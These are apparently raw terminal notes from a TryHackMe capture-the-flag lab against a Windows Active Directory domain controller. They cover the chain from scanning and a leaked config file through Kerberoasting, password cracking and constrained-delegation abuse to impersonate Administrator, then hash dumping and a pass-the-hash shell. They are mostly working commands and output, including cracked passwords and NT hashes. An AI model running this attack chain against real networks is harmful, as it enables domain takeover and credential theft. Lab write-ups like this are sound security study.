
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-02 04:12:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-02T04:13:40+00:00
|_ssl-date: 2026-01-02T04:14:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Not valid before: 2026-01-01T03:43:15
|_Not valid after:  2026-07-03T03:43:15
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1903 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-02T04:13:38
|_  start_date: N/A


```

```
http://crow.thm/robots.txt
User-Agent: *
Disallow:
/robots.txt
/db-config.bak
/backdoor.php

```

```
http://crow.thm/db-config.bak
<?php

$servername = "db.cooctus.corp";
$username = "C00ctusAdm1n";
$password = "B4dt0th3b0n3";

// Create connection $conn = new mysqli($servername, $username, $password);

// Check connection if ($conn->connect_error) {
die ("Connection Failed: " .$conn->connect_error);
}

echo "Connected Successfully";

?>
```

```
./kerbrute userenum -d COOCTUS.CORP --dc 10.67.181.48 -v --safe /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt


    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/01/26 - Ronnie Flathers @ropnop

2026/01/01 23:39:50 >  Using KDC(s):
2026/01/01 23:39:50 >   10.67.181.48:88

david@COOCTUS.CORP
steve@COOCTUS.CORP
mark@COOCTUS.CORP
kevin@COOCTUS.CORP
jeff@COOCTUS.CORP
howard@COOCTUS.CORP
David@COOCTUS.CORP
ben@COOCTUS.CORP
Steve@COOCTUS.CORP

```


Find a user  wia 
```
rdesktop -f -u "" crow.thm
Autoselecting keyboard map 'en-us' from locale
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.

```

```
└─$ crackmapexec smb 10.67.181.48 -u Visitor -p GuestLogin! --users
SMB         10.67.181.48    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
SMB         10.67.181.48    445    DC               [+] COOCTUS.CORP\Visitor:GuestLogin! 
SMB         10.67.181.48    445    DC               [+] Enumerated domain user(s)
SMB         10.67.181.48    445    DC               COOCTUS.CORP\password-reset                 badpwdcount: 0 desc: 
SMB         10.67.181.48    445    DC               COOCTUS.CORP\David                          badpwdcount: 0 desc: 
SMB         10.67.181.48    445    DC               COOCTUS.CORP\Ben                            badpwdcount: 0 desc: 
SMB         10.67.181.48    445    DC               COOCTUS.CORP\evan                           badpwdcount: 0 desc: 
SMB         10.67.181.48    445    DC               COOCTUS.CORP\Varg                           badpwdcount: 0 desc: 

```

```
└─$ smbclient -L //10.67.181.48 -U "Visitor"
Password for [WORKGROUP\Visitor]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Home            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.67.181.48 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                        
┌──(kali㉿kali)-[~/tryhackme/crockcrew]
└─$ smbclient //10.67.181.48/Home -U "Visitor"
Password for [WORKGROUP\Visitor]:
Try "help" to get a list of possible commands.
smb: \> passive
passive: command not found
smb: \> ls
  .                                   D        0  Tue Jun  8 15:42:53 2021
  ..                                  D        0  Tue Jun  8 15:42:53 2021
  user.txt                            A       17  Mon Jun  7 23:14:25 2021

                15587583 blocks of size 4096. 11430245 blocks available
smb: \> cat user.txt
cat: command not found
smb: \> get user.txt
```

```
└─$ impacket-GetUserSPNs COOCTUS.CORP/Visitor:GuestLogin! -request -dc-ip 10.67.181.48 -outputfile TGS.txt
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained 



[-] CCache file is not found. Skipping...


john --wordlist=/usr/share/wordlists/rockyou.txt TGS.txt   

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
resetpassword    (?)     
1g 0:00:00:01 DONE (2026-01-02 00:14) 0.7692g/s 181956p/s 181956c/s 181956C/s riley10..pink107
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                   
```

```
└─$ impacket-findDelegation -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.67.181.48


Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/local/lib/python3.13/dist-packages/impacket-0.13.0.dev0+20250820.203717.835623ae-py3.13.egg/impacket
[+] Connecting to 10.67.181.48, port 389, SSL False, signing True
[+] Total of records returned 4
AccountName     AccountType  DelegationType                      DelegationRightsTo                   SPN Exists 
--------------  -----------  ----------------------------------  -----------------------------------  ----------
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP  No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP               No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                            No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS       No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS                    No         



                                                                                                                                        
┌──(kali㉿kali)-[~/tryhackme/crockcrew]
└─$ impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip 10.67.181.48

Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache


└─$ ls
Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
```

```
                                                                                                                                                 
┌──(kali㉿kali)-[~/tryhackme/crockcrew]
└─$ export KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
                                                                                                                                                 
┌──(kali㉿kali)-[~/tryhackme/crockcrew]
└─$ sudo nano /etc/hosts                      
[sudo] password for kali: 
                                                                                                                                                 
┌──(kali㉿kali)-[~/tryhackme/crockcrew]
└─$ cat /etc/hosts | grep "10.67.181.48"
10.67.181.48 crow.thm DC.COOCTUS.CORP

```

```
└─$ impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

```
└─$ evil-winrm -i 10.67.181.48 -u Administrator -H 'add41095f1fb0405b32f70a489de022d'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path C:\ -Filter user.txt -Recurse -ErrorAction SilentlyContinue


```